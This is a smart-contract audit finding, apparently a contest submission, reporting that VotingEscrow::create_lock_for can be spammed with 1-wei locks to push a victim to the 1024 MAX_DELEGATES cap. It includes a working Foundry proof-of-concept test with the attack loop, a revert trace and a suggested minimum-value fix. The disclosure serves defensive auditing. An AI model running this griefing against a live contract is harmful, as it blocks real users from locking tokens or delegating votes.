# Malicious User can spam `VotingEscrow::create_lock_for` to DoS a user from creating their own position or delegating their votes

## Summary
A malicious user it able to call `VotingEscrow::create_lock_for`, locking only a single wei, as many times as they wish. This means that, a user could use this to put an address at `VotingEscrow::MAX_DELEGATES`.
Doing so would mean two things:
1. The user cannot create any new locks of their own.
2. The user cannot delegate their votes to another address that has tokens of their own.

## Vulnerability Detail
The `VotingEscrow::create_lock_for` function allows users to create locks on behalf of another address. During this process the recipient is minted an ERC-721 token. However the contract has logic in place to ensure that no addresses token balance goes above `MAX_DELEGATES` (1024). This combined with the low economic cost for the attacker to create a lock (they can lock 1 wei of LP tokens) means it would be relatively simple for an attack to temporarily DoS a user ability to create a lock of their own or their ability to delegate their votes to another user as both actions would revert because of the `MAX_DELEGATES` check.

Additionally the attacker could instead do the same but create locks for the delegatee causing the same result when the user attempts to delegate their votes to them. 

**Proof Of Concept**
Consider one example of this attack vector:
1. Alice calls `VotingEscrow::create_lock` to lock her LP tokens
2. Alice's delegate choice creates a lock of their own
3. Bob calls `VotingEscrow::create_lock_for` with Alice as the `_recipient` 1023 times so Alice hits the 1024 cap
4. Alice attempts to delegate her votes to her delegate choice, but the function reverts as their combined balances would equal > MAX_DELEGATES

Add the following test to `VotingEscrow.t.sol` to highlight this issue:
```solidity
    function test_Toad_HitMaxDelegates() public {
        // Get Alice LP tokens
        address alice = makeAddr("alice");
        DAI.mint(alice, 100 ether);
        FLOW.mint(alice, 100 ether);
        // Alice creates a position in VotingEscrow
        vm.startPrank(alice);
        DAI.approve(address(router), 100 ether);
        FLOW.approve(address(router), 100 ether);
        router.addLiquidity(
            address(FLOW),
            address(DAI),
            false,
            100 ether,
            100 ether,
            0,
            0,
            alice,
            block.timestamp
        );
        flowDaiPair.approve(address(escrow), type(uint256).max);
        escrow.create_lock(flowDaiPair.balanceOf(alice), 31 days);
        vm.stopPrank();

        // Get Bob LP tokens
        address bob = makeAddr("bob");
        DAI.mint(bob, 100 ether);
        FLOW.mint(bob, 100 ether);
        // Alice creates a position in VotingEscrow
        vm.startPrank(bob);
        DAI.approve(address(router), 100 ether);
        FLOW.approve(address(router), 100 ether);
        router.addLiquidity(
            address(FLOW),
            address(DAI),
            false,
            100 ether,
            100 ether,
            0,
            0,
            bob,
            block.timestamp
        );
        flowDaiPair.approve(address(escrow), type(uint256).max);
        // Bob spams create_lock_for to Alice 1023 times (+ alice's own == 1024)
        for(uint256 i; i < 1023; i++) {
            // Only costing the user 1 wei of LP token (+ gas)
            escrow.create_lock_for(1, 31 days, alice);
        }
        vm.stopPrank();

        // Alice then attempts to delegate their tokens but reverts
        address aliceDelegatee = makeAddr("delegatee");
        // Delegatee also has their own position
        DAI.mint(aliceDelegatee, 100 ether);
        FLOW.mint(aliceDelegatee, 100 ether);
        vm.startPrank(aliceDelegatee);
        DAI.approve(address(router), 100 ether);
        FLOW.approve(address(router), 100 ether);
        router.addLiquidity(
            address(FLOW),
            address(DAI),
            false,
            100 ether,
            100 ether,
            0,
            0,
            aliceDelegatee,
            block.timestamp
        );
        flowDaiPair.approve(address(escrow), type(uint256).max);
        escrow.create_lock(flowDaiPair.balanceOf(aliceDelegatee), 31 days);
        vm.stopPrank();

        // Alice tries to delegate her votes
        vm.prank(alice);
        vm.expectRevert();
        escrow.delegate(aliceDelegatee);
    }
```
The test reverts with the following stack traces:
```solidity
    ├─ [789697] VotingEscrow::delegate(delegatee: [0x0b3FCb9Fc3560A798cEBe519d5DbFd585C081E5b])
    │   ├─ emit DelegateChanged(delegator: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], fromDelegate: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], toDelegate: delegatee: [0x0b3FCb9Fc3560A798cEBe519d5DbFd585C081E5b])
    │   └─ ← [Revert] revert: dstRep would have too many tokenIds
```
## Impact
If the attacker sent the user 1024 tokens the user would be unable to create their own lock position without first transferring out some of these tokens.
Alternatively if the user already had a position and the attacker sent the remainder required to hit 1024 the user would then not be able to delegate their votes to someone who also has a lock position as it would take the delegatee over the `MAX_DELEGATES` threshold.

## Tool used

Manual Review

## Recommendation
`VotingEscrow::create_lock_for` should have a minimum `_value` requirement to ensure the economic cost of this griefing attack is sufficiently high to deter attackers from attempting it.
